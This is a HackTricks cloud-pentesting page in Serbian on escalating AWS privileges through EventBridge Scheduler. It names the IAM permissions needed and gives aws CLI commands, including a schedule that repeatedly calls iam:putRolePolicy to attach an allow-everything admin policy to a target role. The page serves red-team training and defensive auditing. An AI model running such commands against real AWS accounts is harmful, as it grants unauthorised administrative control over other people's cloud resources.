# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EventBridge Scheduler

EventBridge Scheduler se može koristiti za eskalaciju privilegija zakazivanjem poziva raznim AWS uslugama. Iskorišćavanjem svoje sposobnosti da poziva usluge na zakazanoj osnovi, korisnici sa dovoljnim dozvolama mogu eskalirati privilegije. Evo nekih od ključnih akcija koje EventBridge Scheduler može pokrenuti koristeći šablonske ciljeve:

- Lambda: lambda:InvokeFunction - Pozivanje Lambda funkcija prema rasporedu.
- CodeBuild: codebuild:StartBuild - Pokretanje AWS CodeBuild projekata.
- CodePipeline: codepipeline:StartPipelineExecution - Pokretanje AWS CodePipeline izvršenja.
- ECS: ecs:RunTask - Pokretanje ECS zadataka.
- EventBridge: events:PutEvents - Stavljanje događaja u EventBridge.
- Inspector: inspector:StartAssessmentRun - Pokretanje Amazon Inspector procena.
- Kinesis: kinesis:PutRecord - Stavljanje zapisa u Kinesis tokove.
- Firehose: firehose:PutRecord - Stavljanje zapisa u Firehose tokove isporuke.
- SageMaker: sagemaker:StartPipelineExecution - Pokretanje SageMaker izvršenja.
- SNS: sns:Publish - Objavljivanje poruka na SNS temama.
- SQS: sqs:SendMessage - Slanje poruka u SQS redove.
- Step Functions: states:StartExecution - Pokretanje izvršenja AWS Step Functions.

Ovo su samo neke od šablonskih akcija koje EventBridge Scheduler može izvesti. Međutim, korišćenjem univerzalnih ciljeva, može se pozvati mnogo drugih akcija širom AWS usluga. Univerzalni ciljevi omogućavaju šire API operacije izvan šablonske liste.

Više informacija o EventBridge Scheduler-u u:

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `sts:AssumeRole`, `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

Korisnici sa `sts:AssumeRole`, `iam:PassRole`, i `scheduler:CreateSchedule or scheduler:UpdateSchedule` dozvolama mogu eskalirati privilegije koristeći EventBridge Scheduler za pozivanje usluga koristeći ulogu sa višim privilegijama.

Sa ovim dozvolama, napadač može preuzeti ulogu sa povišenim privilegijama i proslediti tu ulogu EventBridge Scheduler-u prilikom kreiranja ili ažuriranja rasporeda. Raspored se može konfigurisati da izvrši bilo koju od prethodno navedenih akcija, kao što su pozivanje Lambda funkcija, pokretanje ECS zadataka, pokretanje CodePipeline izvršenja, ili bilo koja operacija od 270 AWS usluga koje podržava EventBridge Scheduler. Zakazivanjem ovih akcija, napadač bi mogao zloupotrebiti više privilegije za izvođenje neovlašćenih operacija širom AWS usluga.
\\

Na primer, mogli bi konfigurisati raspored da pozove Lambda funkciju koja je šablonska akcija:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
Pored šablonskih akcija servisa, možete koristiti univerzalne ciljeve u EventBridge Scheduler-u da pozovete širok spektar API operacija za mnoge AWS servise. Univerzalni ciljevi nude fleksibilnost da pozovete gotovo bilo koji API. Jedan primer može biti korišćenje univerzalnih ciljeva dodavanjem "AdminAccessPolicy", koristeći ulogu koja ima "putRolePolicy" politiku:
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## References

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
